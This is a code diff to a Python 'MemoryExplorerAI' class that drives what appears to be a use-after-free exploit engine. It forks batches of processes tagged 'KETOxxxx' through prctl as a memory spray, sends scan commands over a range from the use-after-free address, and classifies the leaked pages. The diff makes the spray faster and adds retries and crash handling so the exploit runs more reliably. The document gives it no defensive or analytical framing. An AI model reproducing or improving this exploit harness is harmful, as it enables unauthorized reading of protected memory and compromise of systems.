@@ -297,19 +297,23 @@ class MemoryExplorerAI:
     def run_learning_loop(self, total_target=1000, batch_size=100):
         """
         Refactored Spray: Continuous learning loop.
-        1. Spray 100 markers (millisecond speed).
-        2. Scan for offsets.
-        3. Save successes to Knowledge Base.
-        4. Kill spray processes to free memory.
-        5. Repeat.
         """
         import ctypes
         libc = ctypes.CDLL(None)
         
         current_total = 0
-        status_msg = ""
+        consecutive_failures = 0
         
         while current_total < total_target:
+            if not self.ensure_engine():
+                consecutive_failures += 1
+                print(f"[!] Engine failed to start. Retry {consecutive_failures}/3...")
+                if consecutive_failures >= 3:
+                    return "Learning Aborted: Engine persistent failure."
+                time.sleep(2)
+                continue
+            
+            consecutive_failures = 0
             print(f"[*] Learning Cycle: {current_total}/{total_target} processes used...")
             batch_pids = []
             
@@ -318,40 +322,54 @@ class MemoryExplorerAI:
                 try:
                     pid = os.fork()
                     if pid == 0:
+                        # Set comm to KETOXXXX
                         libc.prctl(15, f"KETO{current_total + i:04d}".encode(), 0, 0, 0)
                         while True: time.sleep(100)
                     else:
                         batch_pids.append(pid)
-                        time.sleep(0.001) # 1ms interval
+                        time.sleep(0.0005) # 0.5ms interval (faster)
                 except OSError: break
             
+            # Wait for processes to settle
+            time.sleep(0.1)
+
             # 2. Scan and record
-            if self.ensure_engine():
-                try:
-                    self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
-                    self.exploit_proc.stdin.flush()
-                    
-                    while True:
-                        line = self.exploit_proc.stdout.readline().decode().strip()
-                        if not line or "SCAN_DONE" in line: break
-                        if "MATCH:" in line:
-                            va = int(line.split(":")[1], 16)
-                            data = self._read_data_packet()
-                            if data:
-                                classification = self.classify_page(data, va)
-                                if classification['confidence'] > 0.5:
-                                    if not any(int(item['va'], 16) == va for item in self.found_items):
-                                        self.found_items.append(classification)
-                                        print(f" [!] AI LEARNED: {classification['description']} at {hex(va)}")
-                except Exception as e:
-                    print(f"[!] Learning scan failed: {e}")
+            scan_success = False
+            try:
+                self.exploit_proc.stdin.write(f"scan {hex(self.uaf_start)} {hex(self.uaf_start + 0x2000000)}\n".encode())
+                self.exploit_proc.stdin.flush()
+                
+                while True:
+                    line = self.exploit_proc.stdout.readline().decode().strip()
+                    if not line: 
+                        # Engine likely died
+                        break
+                    if "SCAN_DONE" in line: 
+                        scan_success = True
+                        break
+                    if "MATCH:" in line:
+                        va = int(line.split(":")[1], 16)
+                        data = self._read_data_packet()
+                        if data:
+                            classification = self.classify_page(data, va)
+                            if classification['confidence'] > 0.5:
+                                if not any(int(item['va'], 16) == va for item in self.found_items):
+                                    self.found_items.append(classification)
+                                    print(f" [!] AI LEARNED: {classification['description']} at {hex(va)}")
+            except Exception as e:
+                print(f"[!] Learning scan failed: {e}")
             
             # 3. Kill and Cleanup
             for pid in batch_pids:
                 try: os.kill(pid, 9); os.waitpid(pid, 0)
                 except: pass
             
-            current_total += batch_size
+            if not scan_success:
+                print("[!] Scan was interrupted. Engine might have crashed.")
+                time.sleep(1)
+            else:
+                current_total += batch_size
+            
             time.sleep(0.1)
         
         return f"Learning Complete. Total processes: {current_total}."
